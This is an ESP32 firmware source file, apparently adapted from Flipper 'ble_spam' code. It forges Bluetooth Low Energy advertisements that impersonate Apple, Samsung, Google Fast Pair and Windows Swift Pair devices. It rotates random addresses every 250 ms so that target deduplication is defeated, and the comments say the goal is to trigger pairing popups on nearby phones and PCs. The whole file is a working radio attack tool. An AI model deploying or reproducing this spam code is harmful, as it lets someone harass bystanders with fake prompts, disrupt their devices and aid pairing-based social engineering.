// BLE spam beacons. Payload tables and byte layouts adapted from
// Next-Flip/Momentum-Apps ble_spam (continuity.c / easysetup.c / fastpair.c).
//
// AD payloads are composed as raw Flipper-format bytes (length-prefixed AD
// structures) and pushed through NimBLEAdvertisementData::addData so the
// shared NimBLEAdvertising singleton transmits them as-is.
#include "ble_spam.h"
#include "ble_hid.h"
#include "ble_radio.h"
#include "sd_config.h"
#include <Arduino.h>
#include <NimBLEDevice.h>
#include <vector>
#include <esp_random.h>
// ble_hs_id_set_rnd lives in the NimBLE host stack. NimBLE-Arduino doesn't
// re-export it through a public header, so forward-declare here. The
// function is real and exported (NimBLEDevice.cpp links against it).
extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

namespace {
  bool       s_init   = false;
  bool       s_active = false;
  ble_spam::Mode s_mode = ble_spam::ALL;
  uint32_t   s_lastMs  = 0;
  uint32_t   s_txCount = 0;       // exposed to UI via ble_spam::txCount()
  // 250 ms: NimBLE on ESP32-S3 chokes when adv start/stop is hammered
  // tighter than ~200 ms. Slower also means each beacon is on-air long
  // enough to actually pop a notification on most targets.
  const uint32_t ROTATE_MS = 250;

  // Fallback embedded tables — used when /ble_spam/payloads.json isn't present
  // on the SD card. The runtime tables below copy these into mutable vectors so
  // a future SD reload can swap content without a reflash.
  const uint16_t APPLE_PP_MODELS_DEFAULT[] = {
    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
    0x1720, 0x1220, 0x1620,
  };
  const uint8_t APPLE_NA_ACTIONS_DEFAULT[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09,
    0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
  };
  const uint8_t SAMSUNG_WATCH_DEFAULT[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
    0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0xE4,
    0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
  };
  const uint32_t SAMSUNG_BUDS_DEFAULT[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41,
    0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006,
    0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519,
    0xAE073A, 0x011716,
  };
  const uint32_t GOOGLE_FP_DEFAULT[] = {
    0xCD8256, 0x0000F0, 0x92BBBD, 0x821F66, 0xF52494, 0x718FA4,
    0xD446A7, 0x2D7A23, 0x0E30C3, 0x72EF8D, 0x0577B1, 0x05A9BC,
    0x000006, 0x060000, 0x000007, 0x000008, 0x000009, 0x00000B,
    0x0B0000, 0x0C0000, 0x000048, 0x480000, 0x000049, 0x490000,
    0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7,
    0x038F16, 0x0582FD, 0x04ACFC, 0x05A963, 0x07A41C, 0x06D8FC,
    0x057802, 0x202B3D, 0x1F1101, 0x1F181A, 0x06AE20, 0x06C197,
  };
  static const char* const WIN_NAMES_DEFAULT[] = {
    "AirPods Pro",    "Galaxy Buds2 Pro", "Xbox Controller",
    "Surface Pen",    "WH-1000XM5",       "Jabra Elite 85t",
    "Beats Fit Pro",  "JBL Charge 5",     "Bose QC45",
    "Nothing Ear 2",
  };

  // Runtime payload tables — seeded from defaults at begin(), then optionally
  // overwritten from /ble_spam/payloads.json on the SD card.
  std::vector<uint16_t> APPLE_PP_MODELS;
  std::vector<uint8_t>  APPLE_NA_ACTIONS;
  std::vector<uint8_t>  SAMSUNG_WATCH;
  std::vector<uint32_t> SAMSUNG_BUDS;
  std::vector<uint32_t> GOOGLE_FP;
  std::vector<String>   WIN_NAMES;

  void seedDefaults() {
    APPLE_PP_MODELS.assign(std::begin(APPLE_PP_MODELS_DEFAULT), std::end(APPLE_PP_MODELS_DEFAULT));
    APPLE_NA_ACTIONS.assign(std::begin(APPLE_NA_ACTIONS_DEFAULT), std::end(APPLE_NA_ACTIONS_DEFAULT));
    SAMSUNG_WATCH.assign(std::begin(SAMSUNG_WATCH_DEFAULT), std::end(SAMSUNG_WATCH_DEFAULT));
    SAMSUNG_BUDS.assign(std::begin(SAMSUNG_BUDS_DEFAULT), std::end(SAMSUNG_BUDS_DEFAULT));
    GOOGLE_FP.assign(std::begin(GOOGLE_FP_DEFAULT), std::end(GOOGLE_FP_DEFAULT));
    WIN_NAMES.clear();
    for (auto p : WIN_NAMES_DEFAULT) WIN_NAMES.emplace_back(p);
  }

  template <typename T>
  void loadIntArray(JsonVariant arr, std::vector<T>& out) {
    if (!arr.is<JsonArray>() || arr.as<JsonArray>().size() == 0) return;
    out.clear();
    for (JsonVariant v : arr.as<JsonArray>()) out.push_back((T)v.as<uint32_t>());
  }

  void loadFromSD() {
    JsonDocument doc;
    if (!sd_config::loadJson("/ble_spam/payloads.json", doc)) return;
    loadIntArray<uint16_t>(doc["apple_pp"],      APPLE_PP_MODELS);
    loadIntArray<uint8_t> (doc["apple_action"],  APPLE_NA_ACTIONS);
    loadIntArray<uint8_t> (doc["samsung_watch"], SAMSUNG_WATCH);
    loadIntArray<uint32_t>(doc["samsung_buds"],  SAMSUNG_BUDS);
    loadIntArray<uint32_t>(doc["google_fp"],     GOOGLE_FP);
    JsonVariant wn = doc["win_names"];
    if (wn.is<JsonArray>() && wn.as<JsonArray>().size() > 0) {
      WIN_NAMES.clear();
      for (JsonVariant v : wn.as<JsonArray>()) WIN_NAMES.emplace_back(v.as<const char*>());
    }
    Serial.println(F("[spam] payloads loaded from SD"));
  }

  inline uint8_t r8() { return (uint8_t)esp_random(); }

  size_t buildAppleProx(uint8_t* out) {
    uint16_t model = APPLE_PP_MODELS[esp_random() % APPLE_PP_MODELS.size()];
    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : 0x01;
    if (esp_random() % 2) prefix = 0x07;
    uint8_t i = 0;
    out[i++] = 0x1E;
    out[i++] = 0xFF;
    out[i++] = 0x4C; out[i++] = 0x00;
    out[i++] = 0x07;
    out[i++] = 0x19;
    out[i++] = prefix;
    out[i++] = (model >> 8) & 0xFF;
    out[i++] = model & 0xFF;
    out[i++] = 0x55;
    out[i++] = ((r8() % 10) << 4) | (r8() % 10);
    out[i++] = ((r8() % 8)  << 4) | (r8() % 10);
    out[i++] = r8();
    out[i++] = r8();
    out[i++] = 0x00;
    for (uint8_t k = 0; k < 16; k++) out[i++] = r8();
    return i;
  }

  size_t buildAppleAction(uint8_t* out) {
    uint8_t action = APPLE_NA_ACTIONS[esp_random() % APPLE_NA_ACTIONS.size()];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags = 0xBF;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;
    uint8_t i = 0;
    out[i++] = 0x0A;
    out[i++] = 0xFF;
    out[i++] = 0x4C; out[i++] = 0x00;
    out[i++] = 0x0F;
    out[i++] = 0x05;
    out[i++] = flags;
    out[i++] = action;
    out[i++] = r8(); out[i++] = r8(); out[i++] = r8();
    return i;
  }

  size_t buildSamsungWatch(uint8_t* out) {
    uint8_t model = SAMSUNG_WATCH[esp_random() % SAMSUNG_WATCH.size()];
    uint8_t i = 0;
    out[i++] = 0x0E;
    out[i++] = 0xFF;
    out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x00; out[i++] = 0x02; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x01;
    out[i++] = 0xFF; out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0x43;
    out[i++] = model;
    return i;
  }

  size_t buildSamsungBuds(uint8_t* out) {
    uint32_t model = SAMSUNG_BUDS[esp_random() % SAMSUNG_BUDS.size()];
    uint8_t i = 0;
    out[i++] = 0x1B;
    out[i++] = 0xFF;
    out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x42; out[i++] = 0x09; out[i++] = 0x81; out[i++] = 0x02;
    out[i++] = 0x14; out[i++] = 0x15; out[i++] = 0x03; out[i++] = 0x21;
    out[i++] = 0x01; out[i++] = 0x09;
    out[i++] = (model >> 16) & 0xFF;
    out[i++] = (model >> 8)  & 0xFF;
    out[i++] = 0x01;
    out[i++] = model & 0xFF;
    out[i++] = 0x06; out[i++] = 0x3C; out[i++] = 0x94; out[i++] = 0x8E;
    out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0xC7; out[i++] = 0x00;
    return i;          // 28; fits comfortably under 31
  }

  size_t buildWindowsSwiftPair(uint8_t* out) {
    const String& nstr  = WIN_NAMES[esp_random() % WIN_NAMES.size()];
    const char*   name  = nstr.c_str();
    uint8_t       namelen = (uint8_t)nstr.length();
    // Total on-air bytes = 1 (length) + 1 (type) + 2 (CID) + 1 (beacon) + 1 (rssi) + namelen.
    // BLE legacy adv max payload = 31. Clamp name so the whole AD fits.
    if (namelen > 31 - 6) namelen = 31 - 6;
    uint8_t i = 0;
    out[i++] = 5 + namelen;   // AD length: type(1) + CID(2) + beacon(1) + rssi(1) + name
    out[i++] = 0xFF;           // Manufacturer Specific Data
    out[i++] = 0x06; out[i++] = 0x00;  // Microsoft Company ID (0x0006 LE)
    out[i++] = 0x03;           // Microsoft Beacon Type: Swift Pair
    out[i++] = 0x80;           // RSSI byte — triggers the pairing popup
    memcpy(out + i, name, namelen);
    return i + namelen;
  }

  size_t buildGoogleFP(uint8_t* out) {
    uint32_t model = GOOGLE_FP[esp_random() % GOOGLE_FP.size()];
    uint8_t i = 0;
    out[i++] = 0x03; out[i++] = 0x03;
    out[i++] = 0x2C; out[i++] = 0xFE;
    out[i++] = 0x06; out[i++] = 0x16;
    out[i++] = 0x2C; out[i++] = 0xFE;
    out[i++] = (model >> 16) & 0xFF;
    out[i++] = (model >> 8)  & 0xFF;
    out[i++] = model & 0xFF;
    out[i++] = 0x02; out[i++] = 0x0A;
    out[i++] = (uint8_t)((int)(esp_random() % 120) - 100);
    return i;
  }

  // Set the controller's own (random static) address. Without rotating
  // this, every spam frame goes out from the same BD_ADDR — most modern
  // phones and Apple Continuity dedup by BD_ADDR + payload and ignore
  // repeats. Caller MUST ensure the advertiser is stopped before calling;
  // ble_hs_id_set_rnd is rejected while the controller is advertising.
  void setRandomAddr() {
    uint8_t a[6];
    for (int i = 0; i < 6; ++i) a[i] = (uint8_t)esp_random();
    a[5] |= 0xC0;   // top two bits = 11 marks "static random"
    ble_hs_id_set_rnd(a);
  }

  // Single per-beat path: stop, rotate addr, install fresh payload, start.
  // Setting payload BEFORE start() guarantees the on-air frame carries the
  // new address AND the new payload together; doing it after start (the
  // previous order) left a brief window where the new MAC was paired with
  // the previous beat's payload — visible as duplicate-dedup misses on
  // some targets.
  bool pushAdv(const uint8_t* data, size_t len) {
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    if (!adv) return false;
    if (adv->isAdvertising()) adv->stop();
    setRandomAddr();
    NimBLEAdvertisementData d;
    d.addData((char*)data, len);
    adv->setAdvertisementData(d);
    adv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    return adv->start();
  }

  void beat() {
    uint8_t buf[40];
    size_t  len = 0;

    ble_spam::Mode m = s_mode;
    if (m == ble_spam::ALL) m = (ble_spam::Mode)(esp_random() % (uint8_t)ble_spam::ALL);
    switch (m) {
      case ble_spam::APPLE:
        len = (esp_random() % 3 == 0) ? buildAppleAction(buf) : buildAppleProx(buf);
        break;
      case ble_spam::ANDROID: {
        // Rotate across Samsung Buds, Samsung Watch and Google Fast Pair so
        // Android targets get hit regardless of which OEM's pop-up they honor.
        uint8_t pick = esp_random() % 3;
        if      (pick == 0) len = buildSamsungBuds(buf);
        else if (pick == 1) len = buildSamsungWatch(buf);
        else                len = buildGoogleFP(buf);
        break;
      }
      case ble_spam::WINDOWS:
      default:
        len = buildWindowsSwiftPair(buf);
        break;
    }

    bool ok = pushAdv(buf, len);
    if (ok) s_txCount++;
    if ((s_txCount % 50) == 0) {
      Serial.printf("[spam] tx=%u mode=%d len=%u ok=%d\n",
                    (unsigned)s_txCount, (int)m, (unsigned)len, (int)ok);
    }
  }
}

namespace ble_spam {

void begin() {
  if (s_init) return;
  seedDefaults();
  loadFromSD();   // best-effort override; falls back silently if SD absent
  s_init = true;
}

void start(Mode m) {
  if (!s_init) begin();
  s_mode = (m < MODE_COUNT) ? m : ALL;
  ble_hid::suspend();
  ble_radio::acquire(ble_radio::MODE_SPAM);
  // Advertising default is BLE_OWN_ADDR_PUBLIC, which means ble_hs_id_set_rnd
  // is a no-op on air and every spam frame carries the same BD_ADDR — modern
  // OS continuity dedup throws away repeats. Switch to RANDOM so the rotated
  // address actually goes out; restore PUBLIC in stop() for HID.
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  s_active  = true;
  s_lastMs  = 0;
  s_txCount = 0;
}

void stop() {
  if (!s_active) return;
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  if (adv) adv->stop();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
  s_active = false;
  // Releasing the radio fires the HID restore fn the arbiter has on file,
  // which reinstalls connectable HID adv data + starts advertising. This
  // is the fix for the "spam permanently breaks HID pairing" bug.
  ble_radio::release(ble_radio::MODE_SPAM);
  ble_hid::resume();
}

void tick() {
  if (!s_active) return;
  uint32_t now = millis();
  if (now - s_lastMs < ROTATE_MS) return;
  s_lastMs = now;
  beat();
}

bool active() { return s_active; }
Mode mode()   { return s_mode; }
uint32_t txCount() { return s_txCount; }

} // namespace ble_spam
